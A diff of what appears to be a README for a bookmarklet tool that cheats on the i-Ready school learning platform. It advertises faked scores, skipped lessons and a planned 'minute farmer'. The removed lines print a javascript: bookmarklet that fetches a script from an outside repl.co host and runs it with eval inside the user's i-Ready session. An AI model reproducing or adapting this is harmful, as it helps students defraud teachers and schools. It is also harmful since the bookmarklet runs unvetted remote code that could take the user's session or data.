@@ -10,11 +10,6 @@ This can fake an i-Ready score. DOESN'T COUNT AS A PASSED LESSON ITS FAKE<br>
 this will actually skip a lesson for you and count it as whatever score you choose<br>
 **3.Theme**<br>
 You can make your own background<br>
-# Overtaker (cool name ig)
-Drag and drop this into your bookmarks bar and then click it on i-Ready 
-<br>
-`javascript:fetch("https://i-Ready-Overload-30.hgocrazy.repl.co/script.js").then(r=>r.text()).then(r=>eval(r))`
-<br>
 # Next update I will be adding
 **1.Minute farmer**<br>
 You can gain minuites without having to touch your computer<br>
